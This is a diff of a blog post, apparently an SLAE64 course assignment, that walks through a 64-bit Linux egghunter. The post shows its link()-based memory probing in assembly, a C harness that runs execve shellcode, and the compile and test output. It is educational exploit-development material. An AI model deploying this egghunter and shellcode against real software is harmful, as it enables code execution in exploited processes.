@@ -16,7 +16,7 @@ tags:
 ![](/assets/images/SLAE64.png)
 
 # Overview
-For the 3rd assignment of the SLAE64 course I created a 64 bit egghunter. The egghunter uses the link() system call to check if the memory is readable. If readable, the egghunter scans byte by byte for the egg. Once the egghunter finds the egg, it will check to see if there is 2 eggs or only one instance of the egg. If there is only 1 instance of the egg, then the egg hunter is probably reading the egg from itself. To overcome this issue, the egg hunter must find the egg twice.
+For the third assignment of the SLAE64 course I created a 64 bit egghunter. To check if the memory is readable, the egghunter uses the `link()` system call. The egghunter scans the hosts process memory, byte by byte, in search for the egg. Once the egghunter finds the egg, it will check to see if there is 2 eggs or only one instance of the egg. If there is only 1 instance of the egg, then the egg hunter is probably reading the egg from itself. To overcome this issue, the egg hunter must find the egg twice.
 
 # Creating the EggHunter
 ## The Link System Call
@@ -26,7 +26,13 @@ user$ man link.2
 int link(const char *oldpath, const char *newpath);
 rax=0x56     rdi=Address         rsi=0x0
 ```  
-For the purpose of the egghunter, we do not care about what the function/system call really does. All we care about is that it will return an error if the memory address we feed it is not readable. You may be thinking "Why do I need to know if the address is readable or not? Why not just read/scan each byte of the memory space, regardless if it's readable or not?". Well, you will quickly discover that your egghunter will crash the program. To avoid crashing, we will discover readability by passing the memory address to link as the first argument '\*oldpath'. For the second argument '\*newpath' we will set that to 0.  
+For the purpose of the egghunter, we do not care about what the function/system call really does. All we care about is that it will return an error if the memory address we feed it is not readable.   
+You may be thinking 
++ "Why do I need to know if the address is readable or not?"
++ "Why not just read/scan each byte of the memory space, regardless if it's readable or not?"  
+
+Well, if you try that, you will quickly discover that your egghunter crash the host program. To avoid crashing, we will discover readability by passing the memory address to link as the first argument `*oldpath`. For the second argument `*newpath` we will set that to 0.  
+
 #### Assembly for our Link Function
 ```asm
  lea rdi, [rdx+0x8]  ; ARG1=*oldpath
@@ -35,10 +41,12 @@ For the purpose of the egghunter, we do not care about what the function/system 
  add al, 0x56        ; System Call for link()
  syscall             ; Executes link()
 ```  
+
 ### Link() - Cannot Read Memory
-If the memory at the address in rdi is not readable, an error code will be returned in the rax register. After the system call, we will check for this error. If the error exists, then we will check the next memory page.
+If the memory at the address in the `RDI` register is not readable, an error code will be returned in the rax register. After the system call, we will check for this error. If the error exists, then we will check the next memory page.
 
 #### Next Memory Page Assembly
+
 ```asm
 nextPage:            ; Increment RDX to the next memory page
  or dx, 0xfff        ; 0xfff = 4096. Size of page
@@ -52,10 +60,12 @@ nextAddress:         ; Increment RDX to the next memory address
  cmp al, 0xf2        ; Can memory address be read?
  jz nextPage         ; If no, check the next memory page
 ```
-+ The error for not being able to read the memory is 0xfffffffffffffff2. Checking the last byte works just as good as checking all 8 bytes, and it also makes our shellcode length smaller.
+
++ The error for not being able to read the memory is `0xfffffffffffffff2`. Checking the last byte works just as good as checking all 8 bytes, and it also makes our shellcode length smaller.
 
 ### Check for the Egg
 If the memory is readable, then we will check to see if our egg exists at the memory location.
+
 ```asm
  jz nextPage         ; If no, check the next memory page
  xor rbx, rbx
@@ -63,10 +73,12 @@ If the memory is readable, then we will check to see if our egg exists at the me
  cmp [rdx], ebx      ; Egg?
  jnz nextAddress     ; No Egg? Go to next memory page
 ```  
+
 If the egg does not exist, then we will increase the memory address by 1 byte, and check again. We will continue scanning the memory space byte by byte, until either we find the egg or we cannot read the memory. If the memory is unreadable, we will check the next memory page by incrementing the address by 4096ish bytes. 
 
 ### Check for a Double Egg
 If the egg exists, we will see if there are two instances of our egg, or only one. If only one egg exists, then that is not the egg(s) we are looking for. In such a case of only 1 egg, we will keep our scan continuing. Although if our egg exists twice, we will jump to our eggs and execute our payload.
+
 ```asm
  cmp [rdx], ebx      ; Egg?
  jnz nextAddress     ; No Egg? Go to next memory page
@@ -76,7 +88,9 @@ If the egg exists, we will see if there are two instances of our egg, or only on
 ```
 
 # Testing the EggHunter
+
 #### EggHunter Assembly
+
 ```asm
 ; Filename: eggHunter.nasm
 ; Author:   boku
@@ -118,8 +132,12 @@ nextAddress:         ; Increment RDX to the next memory address
  jnz nextAddress     ; No Egg? Check next memory address
  jmp rdx             ; EGG FOUND! Jump to Egg!
 ```
+
 ## Compiling the EggHunter
+
 To test the egghunter, we create a simple C program that will search for our egg(s). Once we find our eggs, the egghunter will jump to our payload and execute our execve shellcode.
+
+
 #### EggHunter C Program
 ```asm
 // Shellcode Title:  Linux/x64 - EggHunter Execve Shellcode (63 Bytes)
@@ -186,6 +204,7 @@ int main()
 ```
 
 ## Testing the EggHunter
+
 ```bash
 root# gcc -m64 -z execstack -fno-stack-protector Hunter.c -o Hunter
 root# echo $$ | xargs ps
@@ -199,4 +218,5 @@ root# echo $$ | xargs ps
   PID TTY      STAT   TIME COMMAND
 14495 pts/4    S      0:00 [bash]
 ```
+
 + Awesome! Our EggHunter works!
